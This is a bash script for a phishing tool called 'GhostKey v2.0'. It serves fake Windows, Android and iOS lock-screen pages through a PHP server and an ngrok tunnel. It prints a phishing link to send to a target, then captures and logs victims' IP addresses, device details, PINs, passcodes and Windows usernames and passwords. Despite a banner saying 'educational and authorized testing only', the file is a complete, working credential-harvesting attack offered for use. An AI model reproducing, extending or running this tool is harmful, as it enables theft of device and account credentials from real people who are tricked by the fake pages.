#!/bin/bash

trap 'printf "\n";stop' 2

banner() {
function print_centered {
     [[ $# == 0 ]] && return 1

     declare -i TERM_COLS="$(tput cols)"
     declare -i str_len="${#1}"
     [[ $str_len -ge $TERM_COLS ]] && {
          echo "$1";
          return 0;
     }

     declare -i filler_len="$(( (TERM_COLS - str_len) / 2 ))"
     [[ $# -ge 2 ]] && ch="${2:0:1}" || ch=" "
     filler=""
     for (( i = 0; i < filler_len; i++ )); do
          filler="${filler}${ch}"
     done

     printf "%s%s%s" "$filler" "$1" "$filler"
     [[ $(( (TERM_COLS - str_len) % 2 )) -ne 0 ]] && printf "%s" "${ch}"
     printf "\n"

     return 0
}

# Modern color scheme
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
NC='\033[0m'

clear
printf "${PURPLE}"
echo ""
echo "    ╔═══════════════════════════════════════════════════════════╗"
echo "    ║                                                           ║"
echo "    ║              🔑  G H O S T K E Y  v2.0  🔑               ║"
echo "    ║                                                           ║"
echo "    ║          Advanced Lockscreen Credential Harvesting        ║"
echo "    ║                                                           ║"
echo "    ╚═══════════════════════════════════════════════════════════╝"
printf "${CYAN}"
echo ""
print_centered "════════════════════════════════════════════════════"
printf "${WHITE}"
print_centered "Developed by: Your Name"
printf "${GRAY}"
print_centered "Enhanced Edition - 2024"
printf "${CYAN}"
print_centered "════════════════════════════════════════════════════"
echo ""
printf "${YELLOW}"
print_centered "⚠️  EDUCATIONAL & AUTHORIZED TESTING ONLY  ⚠️"
printf "${RED}"
print_centered "Unauthorized access is a CRIMINAL OFFENSE"
printf "${GRAY}"
print_centered "You are responsible for your actions"
printf "${NC}"
echo ""
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi

printf "\n${RED}[${WHITE}!${RED}] ${YELLOW}GhostKey shutting down...${NC}\n"
printf "${GRAY}Thank you for using GhostKey${NC}\n\n"
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} PHP is required but not installed. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} curl is required but not installed. Aborting."; exit 1; }
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Target IP:${NC} ${WHITE}%s${NC}\n" $ip
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Device Info:${NC} ${WHITE}%s${NC}\n" $device
cat ip.txt >> ghostkey.logs.txt
}

checkfound() {
printf "\n"
printf "${PURPLE}╔═══════════════════════════════════════════════════════════╗${NC}\n"
printf "${PURPLE}║${NC}  ${CYAN}👻 GhostKey is listening for targets...${NC}                ${PURPLE}║${NC}\n"
printf "${PURPLE}║${NC}  ${GRAY}Press Ctrl+C to stop and exit${NC}                         ${PURPLE}║${NC}\n"
printf "${PURPLE}╚═══════════════════════════════════════════════════════════╝${NC}\n"
printf "\n"

while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
printf "${GREEN}║${NC}  ${YELLOW}🎯 TARGET CONNECTED!${NC}                                    ${GREEN}║${NC}\n"
printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "pin.txt" ]]; then
printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
printf "${GREEN}║${NC}  ${YELLOW}📱 ANDROID PIN CAPTURED!${NC}                              ${GREEN}║${NC}\n"
printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
pin=$(tail -n1 pin.txt)
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}PIN Code:${NC} ${WHITE}%s${NC}\n" $pin
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Saved to:${NC} ${WHITE}ghostkey.android.txt${NC}\n"
cat pin.txt >> ghostkey.android.txt
rm -rf pin.txt
fi

if [[ -e "passwords.txt" ]]; then
printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
printf "${GREEN}║${NC}  ${YELLOW}💻 WINDOWS CREDENTIALS CAPTURED!${NC}                     ${GREEN}║${NC}\n"
printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
username=$(tail -n1 usernames.txt)
password=$(tail -n1 passwords.txt)
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Username:${NC} ${WHITE}%s${NC}\n" $username
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Password:${NC} ${WHITE}%s${NC}\n" $password
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Saved to:${NC} ${WHITE}ghostkey.windows.txt${NC}\n"
cat usernames.txt >> ghostkey.windows.txt
cat passwords.txt >> ghostkey.windows.txt
rm -rf usernames.txt
rm -rf passwords.txt
fi

if [[ -e "passcode.txt" ]]; then
printf "\n${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}\n"
printf "${GREEN}║${NC}  ${YELLOW}🍎 iOS PASSCODE CAPTURED!${NC}                            ${GREEN}║${NC}\n"
printf "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}\n"
passcode=$(tail -n1 passcode.txt)
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Passcode:${NC} ${WHITE}%s${NC}\n" $passcode
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Saved to:${NC} ${WHITE}ghostkey.ios.txt${NC}\n"
cat passcode.txt >> ghostkey.ios.txt
rm -rf passcode.txt
fi

sleep 0.5
done 
}

payload_ngrok() {
url=$redirect
link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' | grep -o 'https://[^"]*' | head -n1)

# Alternative parsing method if first fails
if [[ -z "$link" ]]; then
link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys, json; print(json.load(sys.stdin)['tunnels'][0]['public_url'])" 2>/dev/null)
fi

# Another fallback using sed
if [[ -z "$link" ]]; then
link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | sed -n 's/.*"public_url":"\(https:\/\/[^"]*\)".*/\1/p' | head -n1)
fi

if [[ -z "$link" ]]; then
printf "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}\n"
printf "${RED}║  ❌ NGROK TUNNEL FAILED                                   ║${NC}\n"
printf "${RED}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
printf "${YELLOW}📋 Troubleshooting Steps:${NC}\n\n"
printf "  ${CYAN}Step 1:${NC} Authenticate ngrok (required for free accounts)\n"
printf "     ${WHITE}./ngrok authtoken YOUR_TOKEN${NC}\n"
printf "     ${GRAY}Get token from: ${CYAN}https://dashboard.ngrok.com/get-started/your-authtoken${NC}\n\n"
printf "  ${CYAN}Step 2:${NC} Check ngrok API status\n"
printf "     ${WHITE}curl http://127.0.0.1:4040/api/tunnels${NC}\n\n"
printf "  ${CYAN}Step 3:${NC} Test ngrok manually\n"
printf "     ${WHITE}./ngrok http 3333${NC}\n\n"
exit 1
fi

payload_name="index"
printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Building payload pages...${NC}\n"

sed 's+forwarding_url+'$url'+g' post.php > cat.php
sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

IFS=$'\n'
data_base64=$(base64 -w 0 win2.html 2>/dev/null || base64 win2.html)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g' > index2.html

printf "\n"
printf "${PURPLE}╔═════════════════════════════════════════════════════════════════════════╗${NC}\n"
printf "${PURPLE}║                                                                         ║${NC}\n"
printf "${PURPLE}║${NC}  ${GREEN}✓${NC} ${CYAN}GhostKey Phishing Link:${NC}                                           ${PURPLE}║${NC}\n"
printf "${PURPLE}║${NC}    ${WHITE}%s${NC}%-$((71-${#link}))s${PURPLE}║${NC}\n" "$link" ""
printf "${PURPLE}║                                                                         ║${NC}\n"
printf "${PURPLE}║${NC}  ${GREEN}✓${NC} ${CYAN}Target Redirect URL:${NC}                                             ${PURPLE}║${NC}\n"
printf "${PURPLE}║${NC}    ${GRAY}%s${NC}%-$((71-${#url}))s${PURPLE}║${NC}\n" "$url" ""
printf "${PURPLE}║                                                                         ║${NC}\n"
printf "${PURPLE}╚═════════════════════════════════════════════════════════════════════════╝${NC}\n"
printf "\n"
printf "${CYAN}💡 Tip:${NC} ${GRAY}Send this link to your target device${NC}\n"
printf "${CYAN}📊 Logs:${NC} ${GRAY}All captures will be saved to ghostkey.*.txt files${NC}\n\n"
}

ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} unzip required but not installed. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "${RED}[!]${NC} wget required but not installed. Aborting."; exit 1; }
printf "${CYAN}[${WHITE}↓${CYAN}] ${YELLOW}Downloading ngrok binary...${NC}\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)

if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "${RED}[!]${NC} Download error. For Termux: ${WHITE}pkg install wget${NC}\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "${RED}[!]${NC} Download error\n"
exit 1
fi
fi
fi

pkill -f php > /dev/null 2>&1
pkill -f ngrok > /dev/null 2>&1
sleep 2

printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Starting PHP web server on localhost:3333...${NC}\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 3

printf "${CYAN}[${WHITE}⚙${CYAN}] ${YELLOW}Launching ngrok tunnel service...${NC}\n"
./ngrok http 3333 > /dev/null 2>&1 &

printf "${CYAN}[${WHITE}⏳${CYAN}] ${YELLOW}Establishing secure tunnel connection...${NC}\n"
sleep 10

printf "${CYAN}[${WHITE}🔍${CYAN}] ${YELLOW}Retrieving public URL from ngrok API...${NC}\n"

for i in {1..8}; do
link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' | grep -o 'https://[^"]*' | head -n1)

if [[ -n "$link" ]]; then
printf "${GREEN}[${WHITE}✓${GREEN}] ${YELLOW}Tunnel established successfully!${NC}\n\n"
sleep 1
break
fi

printf "${YELLOW}[${WHITE}⏳${YELLOW}] ${GRAY}Attempt $i/8: Waiting for tunnel response... (3s)${NC}\n"
sleep 3
done

if [[ -z "$link" ]]; then
printf "\n${RED}╔═══════════════════════════════════════════════════════════╗${NC}\n"
printf "${RED}║  ❌ TUNNEL ESTABLISHMENT FAILED                           ║${NC}\n"
printf "${RED}╚═══════════════════════════════════════════════════════════╝${NC}\n\n"
printf "${YELLOW}🔧 Common Solutions:${NC}\n\n"
printf "  ${CYAN}1.${NC} ${WHITE}Ngrok Authentication Required${NC}\n"
printf "     Run: ${WHITE}./ngrok authtoken YOUR_TOKEN${NC}\n"
printf "     Get token: ${CYAN}https://dashboard.ngrok.com/get-started/your-authtoken${NC}\n\n"
printf "  ${CYAN}2.${NC} ${WHITE}Check Ngrok Status${NC}\n"
printf "     Run: ${WHITE}curl http://127.0.0.1:4040/api/tunnels${NC}\n\n"
printf "  ${CYAN}3.${NC} ${WHITE}Manual Ngrok Test${NC}\n"
printf "     Run: ${WHITE}./ngrok http 3333${NC}\n\n"
printf "  ${CYAN}4.${NC} ${WHITE}Network/Firewall Issues${NC}\n"
printf "     Check your internet connection and firewall settings\n\n"
exit 1
fi

payload_ngrok
checkfound
}

redirect() {
default_redirect="https://www.youtube.com"
printf "\n${CYAN}[${WHITE}?${CYAN}] ${YELLOW}Enter redirect URL after credential capture${NC}\n"
printf "${GRAY}   (Target will be redirected here after entering credentials)${NC}\n"
printf "${CYAN}   Default:${NC} ${WHITE}https://www.youtube.com${NC}\n"
printf "${CYAN}└─>${NC} "
read redirect
redirect="${redirect:-${default_redirect}}"
printf "${GREEN}[${WHITE}✓${GREEN}] ${CYAN}Redirect URL set to:${NC} ${WHITE}%s${NC}\n" $redirect
}

banner
dependencies
redirect
ngrok_server